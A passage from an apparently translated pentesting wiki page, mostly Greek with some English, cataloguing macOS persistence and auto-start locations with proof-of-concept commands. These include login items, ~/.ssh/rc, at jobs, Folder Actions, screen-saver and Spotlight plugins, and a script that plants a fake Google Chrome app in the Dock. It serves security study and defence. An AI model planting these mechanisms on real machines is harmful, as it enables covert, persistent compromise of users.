Η εφαρμογή αναζητά ένα μόνο αρχείο, `~/.hammerspoon/init.lua`, και όταν ξεκινήσει, το script θα εκτελεστεί.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά το BetterTouchTool πρέπει να είναι εγκατεστημένο
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
* Ζητά άδειες Automation-Shortcuts και Accessibility

#### Location

* `~/Library/Application Support/BetterTouchTool/*`

Αυτό το εργαλείο επιτρέπει να υποδεικνύονται εφαρμογές ή σενάρια που θα εκτελούνται όταν πατηθούν ορισμένα συντομεύσεις. Ένας επιτιθέμενος μπορεί να είναι σε θέση να ρυθμίσει τη δική του **συντόμευση και ενέργεια για εκτέλεση στη βάση δεδομένων** για να εκτελέσει αυθαίρετο κώδικα (μια συντόμευση θα μπορούσε να είναι απλώς να πατηθεί ένα πλήκτρο).

### Alfred

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά το Alfred πρέπει να είναι εγκατεστημένο
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
* Ζητά άδειες Automation, Accessibility και ακόμη και Full-Disk access

#### Location

* `???`

Επιτρέπει τη δημιουργία ροών εργασίας που μπορούν να εκτελούν κώδικα όταν πληρούνται ορισμένες προϋποθέσεις. Πιθανώς είναι δυνατό για έναν επιτιθέμενο να δημιουργήσει ένα αρχείο ροής εργασίας και να κάνει το Alfred να το φορτώσει (είναι απαραίτητο να πληρώσετε την premium έκδοση για να χρησιμοποιήσετε ροές εργασίας).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά το ssh πρέπει να είναι ενεργοποιημένο και χρησιμοποιούμενο
* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
* Η χρήση SSH απαιτεί FDA access

#### Location

* **`~/.ssh/rc`**
* **Trigger**: Σύνδεση μέσω ssh
* **`/etc/ssh/sshrc`**
* Απαιτείται root
* **Trigger**: Σύνδεση μέσω ssh

{% hint style="danger" %}
Για να ενεργοποιήσετε το ssh απαιτείται Full Disk Access:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Περιγραφή & Εκμετάλλευση

Από προεπιλογή, εκτός αν υπάρχει `PermitUserRC no` στο `/etc/ssh/sshd_config`, όταν ένας χρήστης **συνδέεται μέσω SSH** τα σενάρια **`/etc/ssh/sshrc`** και **`~/.ssh/rc`** θα εκτελούνται.

### **Στοιχεία Σύνδεσης**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά πρέπει να εκτελέσετε το `osascript` με args
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Trigger:** Σύνδεση
* Payload εκμετάλλευσης αποθηκευμένο καλώντας **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Trigger:** Σύνδεση
* Απαιτείται δικαιώματα root

#### Περιγραφή

Στις Προτιμήσεις Συστήματος -> Χρήστες & Ομάδες -> **Στοιχεία Σύνδεσης** μπορείτε να βρείτε **στοιχεία που θα εκτελούνται όταν ο χρήστης συνδέεται**.\
Είναι δυνατή η καταγραφή τους, η προσθήκη και η αφαίρεση από τη γραμμή εντολών:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Αυτά τα στοιχεία αποθηκεύονται στο αρχείο **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Τα **Στοιχεία Σύνδεσης** μπορούν **επίσης** να υποδειχθούν χρησιμοποιώντας το API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) το οποίο θα αποθηκεύσει τη διαμόρφωση στο **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP ως Στοιχείο Σύνδεσης

(Δείτε την προηγούμενη ενότητα σχετικά με τα Στοιχεία Σύνδεσης, αυτή είναι μια επέκταση)

Εάν αποθηκεύσετε ένα **ZIP** αρχείο ως **Στοιχείο Σύνδεσης**, το **`Archive Utility`** θα το ανοίξει και αν το zip ήταν για παράδειγμα αποθηκευμένο στο **`~/Library`** και περιείχε τον φάκελο **`LaunchAgents/file.plist`** με ένα backdoor, αυτός ο φάκελος θα δημιουργηθεί (δεν είναι από προεπιλογή) και το plist θα προστεθεί ώστε την επόμενη φορά που ο χρήστης θα συνδεθεί ξανά, το **backdoor που υποδεικνύεται στο plist θα εκτελείται**.

Μια άλλη επιλογή θα ήταν να δημιουργήσετε τα αρχεία **`.bash_profile`** και **`.zshenv`** μέσα στο HOME του χρήστη, έτσι ώστε αν ο φάκελος LaunchAgents υπάρχει ήδη, αυτή η τεχνική να λειτουργεί ακόμα.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Χρήσιμο για να παρακάμψετε το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά πρέπει να **εκτελέσετε** **`at`** και πρέπει να είναι **ενεργοποιημένο**
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* Πρέπει να **εκτελέσετε** **`at`** και πρέπει να είναι **ενεργοποιημένο**

#### **Περιγραφή**

Οι εργασίες `at` έχουν σχεδιαστεί για **προγραμματισμό μιας φοράς εργασιών** που θα εκτελούνται σε συγκεκριμένες χρονικές στιγμές. Σε αντίθεση με τις cron jobs, οι εργασίες `at` αφαιρούνται αυτόματα μετά την εκτέλεση. Είναι κρίσιμο να σημειωθεί ότι αυτές οι εργασίες είναι επίμονες κατά την επανεκκίνηση του συστήματος, καθιστώντας τις πιθανές ανησυχίες ασφαλείας υπό ορισμένες συνθήκες.

Από **προεπιλογή** είναι **απενεργοποιημένες** αλλά ο χρήστης **root** μπορεί να **τις ενεργοποιήσει** με:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Αυτό θα δημιουργήσει ένα αρχείο σε 1 ώρα:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Έλεγχος της ουράς εργασιών χρησιμοποιώντας `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Από πάνω μπορούμε να δούμε δύο προγραμματισμένες εργασίες. Μπορούμε να εκτυπώσουμε τις λεπτομέρειες της εργασίας χρησιμοποιώντας `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Εάν οι εργασίες AT δεν είναι ενεργοποιημένες, οι δημιουργημένες εργασίες δεν θα εκτελούνται.
{% endhint %}

Τα **αρχεία εργασίας** μπορούν να βρεθούν στο `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
The filename contains the queue, the job number, and the time it’s scheduled to run. For example let’s take a loot at `a0001a019bdcd2`.

* `a` - this is the queue
* `0001a` - job number in hex, `0x1a = 26`
* `019bdcd2` - time in hex. It represents the minutes passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT: 2021. April 27., Tuesday 7:46:00`.

If we print the job file, we find that it contains the same information we got using `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
* It has some basic TCC permissions like Desktop, Documents and Downloads

#### Location

* **`/Library/Scripts/Folder Action Scripts`**
* Root required
* **Trigger**: Access to the specified folder
* **`~/Library/Scripts/Folder Action Scripts`**
* **Trigger**: Access to the specified folder

#### Description & Exploitation

Folder Actions are scripts automatically triggered by changes in a folder such as adding, removing items, or other actions like opening or resizing the folder window. These actions can be utilized for various tasks, and can be triggered in different ways like using the Finder UI or terminal commands.

To set up Folder Actions, you have options like:

1. Crafting a Folder Action workflow with [Automator](https://support.apple.com/guide/automator/welcome/mac) and installing it as a service.
2. Attaching a script manually via the Folder Actions Setup in the context menu of a folder.
3. Utilizing OSAScript to send Apple Event messages to the `System Events.app` for programmatically setting up a Folder Action.
* This method is particularly useful for embedding the action into the system, offering a level of persistence.

The following script is an example of what can be executed by a Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Για να κάνετε το παραπάνω σενάριο χρησιμοποιήσιμο από τις Ενέργειες Φακέλου, μεταγλωττίστε το χρησιμοποιώντας:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Μετά την εκτέλεση του script, ρυθμίστε τις Ενέργειες Φακέλου εκτελώντας το παρακάτω script. Αυτό το script θα ενεργοποιήσει τις Ενέργειες Φακέλου παγκοσμίως και θα συνδέσει συγκεκριμένα το προηγουμένως εκτελεσμένο script στον φάκελο Επιφάνεια Εργασίας.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Εκτελέστε το σενάριο ρύθμισης με:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Αυτή είναι η μέθοδος για να υλοποιήσετε αυτή την επιμονή μέσω GUI:

Αυτό είναι το σενάριο που θα εκτελεστεί:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Συγκεντρώστε το με: `osacompile -l JavaScript -o folder.scpt source.js`

Μετακινήστε το σε:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Τότε, ανοίξτε την εφαρμογή `Folder Actions Setup`, επιλέξτε τον **φάκελο που θα θέλατε να παρακολουθήσετε** και επιλέξτε στην περίπτωσή σας **`folder.scpt`** (στη δική μου περίπτωση τον ονόμασα output2.scp):

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Τώρα, αν ανοίξετε αυτόν τον φάκελο με **Finder**, το σενάριό σας θα εκτελείται.

Αυτή η ρύθμιση αποθηκεύτηκε στο **plist** που βρίσκεται στο **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** σε μορφή base64.

Τώρα, ας προσπαθήσουμε να προετοιμάσουμε αυτή την επιμονή χωρίς πρόσβαση GUI:

1. **Αντιγράψτε το `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** στο `/tmp` για να το κάνετε αντίγραφο ασφαλείας:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Αφαιρέστε** τις Folder Actions που μόλις ρυθμίσατε:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Τώρα που έχουμε ένα κενό περιβάλλον

3. Αντιγράψτε το αρχείο αντιγράφου ασφαλείας: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ανοίξτε την εφαρμογή Folder Actions Setup.app για να καταναλώσετε αυτή τη ρύθμιση: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Και αυτό δεν λειτούργησε για μένα, αλλά αυτές είναι οι οδηγίες από την αναφορά:(
{% endhint %}

### Συντομεύσεις Dock

Αναφορά: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Χρήσιμο για να παρακάμψετε το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά πρέπει να έχετε εγκαταστήσει μια κακόβουλη εφαρμογή μέσα στο σύστημα
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* `~/Library/Preferences/com.apple.dock.plist`
* **Ενεργοποίηση**: Όταν ο χρήστης κάνει κλικ στην εφαρμογή μέσα στο dock

#### Περιγραφή & Εκμετάλλευση

Όλες οι εφαρμογές που εμφανίζονται στο Dock καθορίζονται μέσα στο plist: **`~/Library/Preferences/com.apple.dock.plist`**

Είναι δυνατόν να **προσθέσετε μια εφαρμογή** απλά με:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Χρησιμοποιώντας κάποια **κοινωνική μηχανική** θα μπορούσατε να **παριστάνετε για παράδειγμα το Google Chrome** μέσα στο dock και στην πραγματικότητα να εκτελέσετε το δικό σας σενάριο:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Χρήσιμο για να παρακαμφθεί το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Μια πολύ συγκεκριμένη ενέργεια πρέπει να συμβεί
* Θα καταλήξετε σε άλλο sandbox
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/Library/ColorPickers`
* Απαιτείται δικαιώματα root
* Trigger: Χρησιμοποιήστε τον επιλογέα χρώματος
* `~/Library/ColorPickers`
* Trigger: Χρησιμοποιήστε τον επιλογέα χρώματος

#### Description & Exploit

**Συγκεντρώστε ένα bundle επιλογέα χρώματος** με τον κώδικά σας (μπορείτε να χρησιμοποιήσετε [**αυτόν για παράδειγμα**](https://github.com/viktorstrate/color-picker-plus)) και προσθέστε έναν κατασκευαστή (όπως στην [ενότητα Screen Saver](macos-auto-start-locations.md#screen-saver)) και αντιγράψτε το bundle στο `~/Library/ColorPickers`.

Στη συνέχεια, όταν ενεργοποιηθεί ο επιλογέας χρώματος, ο κώδικάς σας θα πρέπει επίσης να ενεργοποιηθεί.

Σημειώστε ότι το δυαδικό αρχείο που φορτώνει τη βιβλιοθήκη σας έχει ένα **πολύ περιοριστικό sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Χρήσιμο για να παρακαμφθεί το sandbox: **Όχι, γιατί χρειάζεται να εκτελέσετε την εφαρμογή σας**
* TCC bypass: ???

#### Τοποθεσία

* Μια συγκεκριμένη εφαρμογή

#### Περιγραφή & Εκμετάλλευση

Ένα παράδειγμα εφαρμογής με μια Επέκταση Finder Sync [**μπορεί να βρεθεί εδώ**](https://github.com/D00MFist/InSync).

Οι εφαρμογές μπορούν να έχουν `Finder Sync Extensions`. Αυτή η επέκταση θα εισέλθει σε μια εφαρμογή που θα εκτελείται. Επιπλέον, για να μπορέσει η επέκταση να εκτελέσει τον κώδικά της **πρέπει να είναι υπογεγραμμένη** με κάποιο έγκυρο πιστοποιητικό προγραμματιστή της Apple, πρέπει να είναι **sandboxed** (αν και θα μπορούσαν να προστεθούν χαλαρές εξαιρέσεις) και πρέπει να είναι καταχωρημένη με κάτι σαν:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Χρήσιμο για να παρακάμψετε το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά θα καταλήξετε σε ένα κοινό sandbox εφαρμογής
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/System/Library/Screen Savers`
* Απαιτείται root
* **Trigger**: Επιλέξτε το screensaver
* `/Library/Screen Savers`
* Απαιτείται root
* **Trigger**: Επιλέξτε το screensaver
* `~/Library/Screen Savers`
* **Trigger**: Επιλέξτε το screensaver

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Δημιουργήστε ένα νέο έργο στο Xcode και επιλέξτε το πρότυπο για να δημιουργήσετε ένα νέο **Screen Saver**. Στη συνέχεια, προσθέστε τον κώδικά σας σε αυτό, για παράδειγμα τον παρακάτω κώδικα για να δημιουργήσετε logs.

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Σημειώστε ότι επειδή μέσα στα δικαιώματα του δυαδικού αρχείου που φορτώνει αυτόν τον κώδικα (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) μπορείτε να βρείτε **`com.apple.security.app-sandbox`** θα είστε **μέσα στο κοινό sandbox εφαρμογών**.
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Χρήσιμο για να παρακάμψει το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά θα καταλήξετε σε ένα sandbox εφαρμογής
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
* Το sandbox φαίνεται πολύ περιορισμένο

#### Location

* `~/Library/Spotlight/`
* **Trigger**: Δημιουργείται ένα νέο αρχείο με μια επέκταση που διαχειρίζεται το spotlight plugin.
* `/Library/Spotlight/`
* **Trigger**: Δημιουργείται ένα νέο αρχείο με μια επέκταση που διαχειρίζεται το spotlight plugin.
* Απαιτείται root
* `/System/Library/Spotlight/`
* **Trigger**: Δημιουργείται ένα νέο αρχείο με μια επέκταση που διαχειρίζεται το spotlight plugin.
* Απαιτείται root
* `Some.app/Contents/Library/Spotlight/`
* **Trigger**: Δημιουργείται ένα νέο αρχείο με μια επέκταση που διαχειρίζεται το spotlight plugin.
* Απαιτείται νέα εφαρμογή

#### Description & Exploitation

Το Spotlight είναι η ενσωματωμένη λειτουργία αναζήτησης του macOS, σχεδιασμένη να παρέχει στους χρήστες **γρήγορη και ολοκληρωμένη πρόσβαση σε δεδομένα στους υπολογιστές τους**.\
Για να διευκολύνει αυτή τη γρήγορη δυνατότητα αναζήτησης, το Spotlight διατηρεί μια **ιδιόκτητη βάση δεδομένων** και δημιουργεί έναν δείκτη μέσω **ανάλυσης των περισσότερων αρχείων**, επιτρέποντας γρήγορες αναζητήσεις τόσο μέσω των ονομάτων αρχείων όσο και του περιεχομένου τους.

Ο υποκείμενος μηχανισμός του Spotlight περιλαμβάνει μια κεντρική διαδικασία που ονομάζεται 'mds', που σημαίνει **'metadata server'.** Αυτή η διαδικασία οργανώνει ολόκληρη την υπηρεσία Spotlight. Συμπληρώνοντας αυτό, υπάρχουν πολλαπλοί δαίμονες 'mdworker' που εκτελούν διάφορες εργασίες συντήρησης, όπως η ευρετηρίαση διαφορετικών τύπων αρχείων (`ps -ef | grep mdworker`). Αυτές οι εργασίες καθίστανται δυνατές μέσω των plugins εισαγωγέων Spotlight, ή **".mdimporter bundles**", που επιτρέπουν στο Spotlight να κατανοεί και να ευρετηριάζει περιεχόμενο σε μια ποικιλία μορφών αρχείων.

Τα plugins ή **`.mdimporter`** bundles βρίσκονται στις προαναφερθείσες τοποθεσίες και αν εμφανιστεί ένα νέο bundle, φορτώνεται μέσα σε ένα λεπτό (δεν χρειάζεται να επανεκκινήσετε καμία υπηρεσία). Αυτά τα bundles πρέπει να υποδεικνύουν ποιοι **τύποι αρχείων και επεκτάσεις μπορούν να διαχειριστούν**, με αυτόν τον τρόπο, το Spotlight θα τα χρησιμοποιήσει όταν δημιουργηθεί ένα νέο αρχείο με την υποδεικνυόμενη επέκταση.

Είναι δυνατόν να **βρείτε όλους τους `mdimporters`** που είναι φορτωμένοι τρέχοντας:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Και για παράδειγμα **/Library/Spotlight/iBooksAuthor.mdimporter** χρησιμοποιείται για την ανάλυση αυτού του τύπου αρχείων (επέκταση `.iba` και `.book` μεταξύ άλλων):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Αν ελέγξετε το Plist άλλων `mdimporter` μπορεί να μην βρείτε την καταχώρηση **`UTTypeConformsTo`**. Αυτό συμβαίνει επειδή είναι ένας ενσωματωμένος _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) και δεν χρειάζεται να καθορίσει επεκτάσεις.

Επιπλέον, οι προεπιλεγμένες προσθήκες του συστήματος έχουν πάντα προτεραιότητα, επομένως ένας επιτιθέμενος μπορεί να έχει πρόσβαση μόνο σε αρχεία που δεν ευρετηριάζονται διαφορετικά από τους δικούς του `mdimporters` της Apple.
{% endhint %}

Για να δημιουργήσετε τον δικό σας εισαγωγέα μπορείτε να ξεκινήσετε με αυτό το έργο: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) και στη συνέχεια να αλλάξετε το όνομα, το **`CFBundleDocumentTypes`** και να προσθέσετε **`UTImportedTypeDeclarations`** ώστε να υποστηρίζει την επέκταση που θα θέλατε να υποστηρίξετε και να τις αναφέρετε στο **`schema.xml`**.\
Στη συνέχεια **αλλάξτε** τον κώδικα της συνάρτησης **`GetMetadataForFile`** για να εκτελεί την payload σας όταν δημιουργείται ένα αρχείο με την επεξεργασμένη επέκταση.

Τέλος **κατασκευάστε και αντιγράψτε τον νέο σας `.mdimporter`** σε μία από τις προηγούμενες τοποθεσίες και μπορείτε να ελέγξετε αν φορτώνεται **παρακολουθώντας τα logs** ή ελέγχοντας **`mdimport -L.`**

### ~~Πίνακας Προτιμήσεων~~

{% hint style="danger" %}
Δεν φαίνεται να λειτουργεί πια.
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

